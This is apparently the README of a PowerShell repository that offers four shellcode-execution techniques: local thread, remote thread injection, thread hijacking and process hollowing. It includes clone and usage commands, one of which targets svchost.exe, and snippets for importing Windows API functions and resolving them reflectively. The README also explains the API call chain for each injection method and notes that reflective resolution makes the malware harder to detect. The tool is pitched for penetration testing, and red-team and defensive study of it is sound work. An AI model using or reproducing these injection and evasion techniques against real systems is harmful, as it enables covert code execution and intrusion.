# **PowerShell-Shellcode-Exec**

PowerShell is an excellent tool built into Windows. Because of this, we can leverage it against any standard computer with basic knowledge of the .NET framework. Shellcode execution may be a vital aspect to penetration testing and must be accomplished.

There are many ways to get shellcode executed on a device, but I will be going over 2 execution methods and 4 types of shellcode execution.

### **Setup**

```powershell
git clone https://github.com/SilentisVox/PowerShellcode-Shellcode-Exec
cd PowerShellcode-Shellcode-Exec
```

### **Usage**

```powershell
cd "./Standard Windows API"

. "./Local Thread/Invoke-ShellcodeViaLocalThread.ps1"
. "./Remote Thread/Invoke-ShellcodeViaRemoteThread.ps1"
. "./Thread Hijack/Invoke-ShellcodeViaThreadHijack.ps1"
. "./Process Hollow/Invoke-ShellcodeViaProcessHollow.ps1"

Invoke-ShellcodeViaLocalThread -Shellcode $Shellcode -Verbose
Invoke-ShellcodeViaRemoteThread -Shellcode $Shellcode -TargetPID 1234 -Verbose
Invoke-ShellcodeViaThreadHijack -Shellcode $Shellcode -TargetPID 1234 -TargetTID 5678 -Verbose
Invoke-ShellcodeViaProcessHollow -Shellcode $Shellcode -ProcessPath "C:\Windows\System32\svchost.exe" -Verbose
```

```powershell
cd "./Function Resolutions"

. "./Local Thread/Invoke-ShellcodeViaLocalThread.ps1"
. "./Remote Thread/Invoke-ShellcodeViaRemoteThread.ps1"
. "./Thread Hijack/Invoke-ShellcodeViaThreadHijack.ps1"
. "./Process Hollow/Invoke-ShellcodeViaProcessHollow.ps1"

Invoke-ShellcodeViaLocalThread -Shellcode $Shellcode -Verbose
Invoke-ShellcodeViaRemoteThread -Shellcode $Shellcode -TargetPID 1234 -Verbose
Invoke-ShellcodeViaThreadHijack -Shellcode $Shellcode -TargetPID 1234 -TargetTID 5678 -Verbose
Invoke-ShellcodeViaProcessHollow -Shellcode $Shellcode -ProcessPath "C:\Windows\System32\svchost.exe" -Verbose
```

## **Brief Explanation**

![Ghost](assets/Ghost.jpg)

### **Windows API**

There are 2 ways I have covered in order to use Windows API functions. Either adding a type defintion that pulls function from a given dll, or reflectively resolving functions, and using them as such.

###### Type Definition

```powershell
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Kernel32
{
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
}
"@
```

###### Reflective Resolution

```powershell
$UnsafeMethodsType                  = $SystemAssembly.GetType("Microsoft.Win32.UnsafeNativeMethods")
$NativeMethodsType                  = $SystemAssembly.GetType("Microsoft.Win32.NativeMethods")

$GetModuleHandle                    = $UnsafeMethodsType.GetMethod("GetModuleHandle")
$GetProcAddress                     = $UnsafeMethodsType.GetMethod("GetProcAddress", [Reflection.BindingFlags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @([IntPtr], [String]), $null);

$Kernel32Handle                     = $GetModuleHandle.Invoke($null, @("kernel32.dll"))
$OpenProcessAddress                 = $GetProcAddress.Invoke($null, @($Kernel32Handle, "OpenProcess"))

# Obviously setup delegate for function pointer.
$OpenProcess                        = Get-Delegate $OpenProcessAddress @([Int], [Bool], [Int]) ([IntPtr])
```

### **Execution Methods**

Before diving into the individual execution methods, it's important to understand that each technique can be implemented using either the standard Windows API or through function resolution. The Windows API uses directly imported functions like VirtualAlloc and CreateThread, while function resolution involves manually locating these functions in memory, bypassing the import table and making the malware harder to detect.

### **Execution Techniques**

Each method below is implemented using both Windows APIs and resolved function pointers.

#### **Local Thread**
With executing memory via Local Thread, we need to know the functions required to do so. Because we are occupying the space inside the process already, we don't need to get fancy with anything. The process is straight-forward. We need to allocate memory within the process via `VirtualAlloc`. Then we will create a thread from the outputted memory address with `CreateThread`. Finally, wait for execution to finish `WaitForSingleObject`.

#### **Remote Thread**
Executing via Remote Thread involves injecting into another process. First, obtain a handle to the target process using `OpenProcess`. Next, allocate memory inside the remote process using `VirtualAllocEx`, and write the payload into that memory via `WriteProcessMemory`. Once the payload is written, create a new thread in the target process using `CreateRemoteThread`. Optionally, wait for it to complete with `WaitForSingleObject`.

#### **Thread Hijack**
Thread Hijacking involves taking control of an existing thread in a process. Begin by acquiring a handle to the target thread using `OpenThread`. Suspend it with `SuspendThread`, then retrieve its current execution context using `GetThreadContext`. Modify the instruction pointer (EIP/RIP) to point to your payload and apply the changes with `SetThreadContext`. Finally, resume execution using `ResumeThread`.

#### **Process Hollow**
Process Hollowing is a stealthy technique to replace the contents of a legitimate process with malicious code. First, spawn a suspended process using `CreateProcess` with the `CREATE_SUSPENDED` flag. Unmap its memory space using `NtUnmapViewOfSection`, then allocate new memory with `VirtualAllocEx`. Write the payload into this space with `WriteProcessMemory`, update the thread context to the new entry point using `SetThreadContext`, and resume execution with `ResumeThread`.
